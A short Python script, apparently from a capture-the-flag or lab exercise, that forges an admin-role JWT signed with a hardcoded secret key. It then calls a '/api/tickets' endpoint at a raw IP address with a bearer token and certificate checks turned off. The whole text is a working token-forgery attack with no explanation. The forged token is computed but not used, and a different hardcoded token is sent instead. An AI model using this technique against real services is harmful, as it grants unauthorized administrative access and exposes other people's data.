import jwt
import time

payload = {
    "userId": "8d649724-85ba-4395-a829-b549c32e7bc6",
    "username": "admin1",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 8 * 3600
}

token = jwt.encode(payload, "SecretKey-CriticalOps-2025", algorithm="HS256")

import requests

url = "https://94.237.54.192:48717/api/tickets"
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI4ZDY0OTcyNC04NWJhLTQzOTUtYTgyOS1iNTQ5YzMyZTdiYzYiLCJ1c2VybmFtZSI6ImFkbWluMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MTExNzM5NywiZXhwIjoxNzUxMTQ2MTk3fQ.Zeh1zkIAB78q66o2f_vzDa_BdRD7f2zClgub2etGENg"
}

r = requests.get(url, headers=headers, verify=False)
print(r.text)
